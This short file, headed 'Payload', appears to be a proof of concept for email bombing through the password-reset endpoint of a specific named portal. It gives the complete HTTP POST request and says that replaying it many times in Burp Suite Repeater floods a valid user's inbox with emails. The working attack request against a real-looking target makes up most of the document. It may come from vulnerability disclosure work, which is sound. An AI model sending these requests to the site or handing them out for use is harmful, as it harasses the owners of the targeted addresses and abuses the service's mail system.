# Payload

Using Burp Suite (Repeater) you can send multiple Requests for a valid existing user email and that user's Email Inbox will be bombed with tons of emails


POST /user-management/user/reset-password/request?userEmail=validEmail@gmail.com HTTP/1.1
Host: portal.skillab-project.eu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: https://portal.skillab-project.eu
Referer: https://portal.skillab-project.eu/forgot-password
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Content-Length: 0
Te: trailers
Connection: keep-alive



